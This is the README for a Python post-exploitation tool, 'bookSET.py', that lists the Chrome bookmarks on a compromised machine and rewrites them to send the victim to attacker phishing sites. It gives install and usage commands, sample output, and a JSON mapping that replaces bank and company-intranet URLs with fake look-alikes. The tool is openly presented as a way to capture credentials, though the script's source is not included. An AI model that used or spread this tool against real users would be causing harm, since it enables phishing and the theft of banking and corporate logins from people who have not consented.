A simple script for Post-Exploitation - by @_mrpack

This script was generated to modify all URLs in BookMarks from Google Chrome, this script can be use for capture some credentials with Phishing sites or just redirect the "victim" to your EvilServer.

Ok... first of all we need to install just one library for ASCII Art:

```bash
pip install pyfiglet

```

```bash
python bookSET.py -h

| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|


just a simple post-exploitation tool :)

usage: bookSET.py [-h] [-recon] [-replace]

Get and Replace all Urls from Google Chrome BookMarks

optional arguments:
  -h, --help  show this help message and exit

```


## [+] Recon Mode 

If you want to know what BookMarks the target has, then we just need to execute the following command line:
```bash
python bookSET.py -recon

```

and the output should be something like this:

```bash

 ____              _     ____  _____ _____
| __ )  ___   ___ | | __/ ___|| ____|_   _|
|  _ \ / _ \ / _ \| |/ /\___ \|  _|   | |
| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|

 - https://intranet.companie.org

[+] Total of BookMarks identified : [5]

```

## [+] Replace Mode

Now that we know all the BookMark that the target has, we can check all the URLs and just make a "fake website"  for each URL that we want ;) :

```bash
python bookSET.py -replace

```

and the output should be something like this:

```bash

 ____              _     ____  _____ _____
| __ )  ___   ___ | | __/ ___|| ____|_   _|
|  _ \ / _ \ / _ \| |/ /\___ \|  _|   | |
| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|


just a simple post-exploitation tool :)

[+] URLs modified:

     [-] https://www.fakebank.com/
     [-] https://intranet.fakecompanie.org/

```

## bookmarks.json file content

The content of "bookmarks.json" it's easy to understand, the "current_url" it's the URL that we want to change and put the "new_url" instead.

```bash

{
    "bookmark_bar": [
      {
        "current_url": "https://www.bank.com/",
        "new_url": "https://www.fakebank.com/"
      },
      {
        "current_url": "https://intranet.companie.org/",
        "new_url": "https://intranet.fakecompanie.org/"
      }
    ]
  }
  
  ```
